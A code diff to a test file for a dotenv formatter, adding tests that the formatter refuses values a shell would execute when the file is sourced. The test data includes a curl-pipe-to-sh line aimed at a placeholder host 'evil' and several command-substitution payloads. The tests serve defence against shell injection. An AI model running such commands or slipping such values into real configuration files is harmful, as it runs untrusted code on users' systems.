@@ -1,3 +1,7 @@
+import { execFileSync } from "node:child_process";
+import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 import type { SecretValueType } from "@anchor/shared";
 import { parse as parseDotenv } from "dotenv";
 import { describe, expect, it } from "vitest";
@@ -19,15 +23,26 @@ const VALUES = [
   "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg\n-----END PRIVATE KEY-----",
   'say "hi"',
   "it's",
-  `both ' and "`,
   "",
   "🔑 ünïcødé",
   "C:\\path\\name",
   "  padded  ",
   "trailing newline\n",
   "it's\nmulti-line",
-  "back`tick and 'quote'",
   "$HOME $" + "{X}",
+];
+
+/** Legal for the dotenv parser, but a shell would run or expand them: refused since 0.5.3. */
+const SHELL_UNSAFE = [
+  "it's $(curl evil|sh)",
+  "it's `id`",
+  "it's $HOME",
+  `it's "quoted"`,
+  `both ' and "`,
+  "back`tick and 'quote'",
+  "a\"b`c'd",
+  "it's\\",
+  "it's \\\\ two",
 ];
 
 describe("formatDotenv", () => {
@@ -42,9 +57,130 @@ describe("formatDotenv", () => {
     expect(formatDotenv([e("A", "plain-1.2:3@x/y+z,w")])).toBe("A=plain-1.2:3@x/y+z,w\n");
     expect(formatDotenv([e("A", "with space")])).toBe("A='with space'\n");
     expect(formatDotenv([e("A", "a\nb")])).toBe('A="a\\nb"\n');
-    expect(formatDotenv([e("A", `both ' and "`)])).toBe("A=`both ' and \"`\n");
     expect(formatDotenv([e("A", "")])).toBe("A=\n");
   });
+
+  it("keeps 0.5.2 output for ordinary values", () => {
+    expect(
+      formatDotenv([
+        e("U", "postgres://u:p@h:5432/db"),
+        e("P", "a b$c"),
+        e("Q", "it's fine"),
+        e("M", "l1\nl2"),
+      ]),
+    ).toBe('U=postgres://u:p@h:5432/db\nP=\'a b$c\'\nQ="it\'s fine"\nM="l1\\nl2"\n');
+  });
+
+  it("a value ending in a backslash fails instead of corrupting the lines after it", () => {
+    expect(() => formatDotenv([e("A", "x\\"), e("B", "y")])).toThrow(
+      /cannot be represented in dotenv/,
+    );
+    expect(parseDotenv(formatDotenv([e("A", "C:\\dir\\x"), e("B", "y")]))).toEqual({
+      A: "C:\\dir\\x",
+      B: "y",
+    });
+  });
+
+  it.each(SHELL_UNSAFE)("refuses %j instead of writing a line a shell would run", (v) => {
+    expect(() => formatDotenv([e("K", v)])).toThrow(/cannot be represented in dotenv/);
+  });
+
+  it.skipIf(process.platform === "win32")(
+    "no accepted value runs a command when the file is sourced by sh",
+    () => {
+      const dir = mkdtempSync(join(tmpdir(), "anchor-dotenv-"));
+      try {
+        const marker = join(dir, "pwned");
+        const payloads = [
+          `$(touch ${marker})`,
+          `\`touch ${marker}\``,
+          `it's $(touch ${marker})`,
+          `it's \`touch ${marker}\``,
+          `a"b'c$(touch ${marker})`,
+          `x\n$(touch ${marker})`,
+          `$(touch ${marker})'`,
+        ];
+        for (const v of payloads) {
+          let text: string;
+          try {
+            text = formatDotenv([e("K", v)]);
+          } catch {
+            continue; // refused: nothing written
+          }
+          const file = join(dir, ".env");
+          writeFileSync(file, text);
+          execFileSync("sh", ["-c", `. "${file}"`], { cwd: dir, stdio: "ignore" });
+          expect(existsSync(marker), `sourcing ${JSON.stringify(text)}`).toBe(false);
+        }
+      } finally {
+        rmSync(dir, { recursive: true, force: true });
+      }
+    },
+  );
+
+  it.skipIf(process.platform === "win32")(
+    "no accepted set of values runs a command when the whole file is sourced by sh",
+    () => {
+      const dir = mkdtempSync(join(tmpdir(), "anchor-dotenv-"));
+      try {
+        const marker = join(dir, "pwned");
+        // A value can end a quoted string early for the next line (a trailing backslash escapes
+        // the closing quote), so whole files are sourced, not one value at a time.
+        const parts = [
+          "it's",
+          "\\",
+          "'",
+          '"',
+          "\n",
+          "#",
+          ";",
+          " ",
+          "$",
+          "x",
+          `; touch ${marker}; #`,
+        ];
+        let seed = 7;
+        const next = () => {
+          seed = (seed * 1103515245 + 12345) % 2 ** 31;
+          return seed;
+        };
+        const files = [
+          [e("A", "it's\\"), e("B", `x; touch ${marker}; #'`)],
+          ...Array.from({ length: 300 }, () =>
+            Array.from({ length: 3 }, (_, i) =>
+              e(
+                `K${i}`,
+                Array.from({ length: 1 + (next() % 4) }, () => parts[next() % parts.length]).join(
+                  "",
+                ),
+              ),
+            ),
+          ),
+        ];
+        for (const entries of files) {
+          let text: string;
+          try {
+            text = formatDotenv(entries);
+          } catch {
+            continue; // refused: nothing written
+          }
+          const file = join(dir, ".env");
+          writeFileSync(file, text);
+          try {
+            execFileSync("sh", ["-c", `. "${file}"`], { cwd: dir, stdio: "ignore" });
+          } catch {
+            // a syntax error is not an execution; the marker check below decides
+          }
+          expect(existsSync(marker), `sourcing ${JSON.stringify(text)}`).toBe(false);
+          expect(parseDotenv(text), text).toEqual(
+            Object.fromEntries(entries.map((x) => [x.key, x.value])),
+          );
+        }
+      } finally {
+        rmSync(dir, { recursive: true, force: true });
+      }
+    },
+  );
 
   it("writes one line per entry", () => {
     const text = formatDotenv([e("A", "1"), e("B", "x y")]);
